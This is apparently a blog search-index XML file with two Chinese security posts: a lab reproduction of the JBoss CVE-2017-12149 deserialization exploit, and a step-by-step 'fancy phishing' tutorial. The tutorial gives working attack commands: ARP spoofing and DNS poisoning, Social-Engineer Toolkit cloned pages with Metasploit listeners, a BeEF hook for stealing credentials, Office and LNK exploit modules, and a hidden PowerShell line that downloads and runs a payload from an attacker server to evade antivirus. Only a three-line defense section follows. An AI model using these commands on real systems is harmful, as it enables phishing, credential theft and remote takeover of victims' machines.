<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[JOBSS反序列化漏洞复现]]></title>
      <url>/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
<p>./jboss-6.1.0.Final/bin/run.sh</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
<p>nmap 192.168.1.111 -A </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180923_jatTku_6333.jpeg" alt=""></p>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[花式钓鱼法]]></title>
      <url>/2017/12/27/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h4 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h4><a id="more"></a>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182440_peGRkR_6191.jpeg" alt=""></p>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1). 环境准备："></a>1). 环境准备：</h3><h3 id="1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"><a href="#1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）" class="headerlink" title="1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"></a>1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）</h3><h3 id="2-windows-xp"><a href="#2-windows-xp" class="headerlink" title="2. windows xp"></a>2. windows xp</h3><h3 id="3-window-7"><a href="#3-window-7" class="headerlink" title="3. window 7"></a>3. window 7</h3><h1 id="情景一："><a href="#情景一：" class="headerlink" title="情景一："></a>情景一：</h1><blockquote>
<p>利用Java Applet 进行钓鱼，不过现在的浏览器已经开始禁止这些插件了，要利用这种情景最好先做好前期的信息收集，判断目标是否支持Java Applet</p>
</blockquote>
<h4 id="第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T"><a href="#第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T" class="headerlink" title="第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T"></a>第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T</h4><blockquote>
<p>git clone <a href="https://github.com/trustedsec/social-engineer-toolkit.git" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit.git</a></p>
</blockquote>
<h4 id="第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功"><a href="#第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功" class="headerlink" title="第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功"></a>第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功</h4><blockquote>
<p>vim /etc/setoolkit/set.config</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182513_m24bV3_6241.jpeg" alt=""></p>
<h4 id="第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;1&emsp;2&emsp;no&emsp;回车&emsp;2&emsp;www.baidu.com&emsp;1&emsp;443&emsp;1 </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182524_72fK5L_6258.jpeg" alt=""></p>
<h4 id="第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"><a href="#第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听" class="headerlink" title="第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"></a>第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听</h4><blockquote>
<p>kill 0</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182535_47xLHO_6268.jpeg" alt=""></p>
<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182544_uI1YdI_6356.jpeg" alt=""></p>
<hr>
<h1 id="情景二："><a href="#情景二：" class="headerlink" title="情景二："></a>情景二：</h1><blockquote>
<p>利用浏览器漏洞和中间人攻击进行钓鱼，不过这个漏洞已经比较老了，笔者只在xp上成功过，不过这里提供一种思路，万一哪天IE又抽风来个CVE…</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit </p>
<p>依次按照如下顺序：1&emsp;2&emsp;2&emsp;1&emsp;no&emsp;回车&emsp;5&emsp;37&emsp;2&emsp;443</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182556_R3oubQ_6381.jpeg" alt=""></p>
<h4 id="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"><a href="#第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个" class="headerlink" title="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"></a>第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个</h4><blockquote>
<p>kill 0</p>
<p>set srvport 80</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182608_ZogrCp_6390.jpeg" alt=""></p>
<h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
<p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
<hr>
<h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
<p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面"><a href="#第一步：启动setookit-构造钓鱼页面" class="headerlink" title="第一步：启动setookit 构造钓鱼页面"></a>第一步：启动setookit 构造钓鱼页面</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
<h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
<p>vim ~/.set/web_clone/index.html</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
<h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
<p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
<hr>
<h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
<p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
</blockquote>
<h4 id="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"><a href="#第一步：下载EXP，并将EXP集成到msf的fileformat模块当中" class="headerlink" title="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"></a>第一步：下载EXP，并将EXP集成到msf的fileformat模块当中</h4><blockquote>
<p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
<p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
<h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
<p>reload_all</p>
<p>use exploit/windows/fileformat/office_ms17_11882</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
<hr>
<h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
<p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
</blockquote>
<h4 id="第一步：下载并安装Empire，这里有Empire详细的使用教程"><a href="#第一步：下载并安装Empire，这里有Empire详细的使用教程" class="headerlink" title="第一步：下载并安装Empire，这里有Empire详细的使用教程"></a>第一步：下载并安装Empire，这里有Empire详细的<a href="https://xianzhi.aliyun.com/forum/topic/67/" target="_blank" rel="external">使用教程</a></h4><blockquote>
<p>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="external">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
<p>launcher powershell times0ng</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
<h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
<p>service apache2 start</p>
<p>vim /var/www/html/empire.psl</p>
</blockquote>
<h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
<p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
<hr>
<h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
<p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
</blockquote>
<h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183138_XzAql1_6518.jpeg" alt=""></p>
<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183205_jgJnId_6529.jpeg" alt=""></p>
<hr>
<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h4 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h4><h4 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h4><h4 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h4><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[RINET 的妙用]]></title>
      <url>/2017/12/23/RINETD%20%E7%9A%84%E5%A6%99%E7%94%A8/</url>
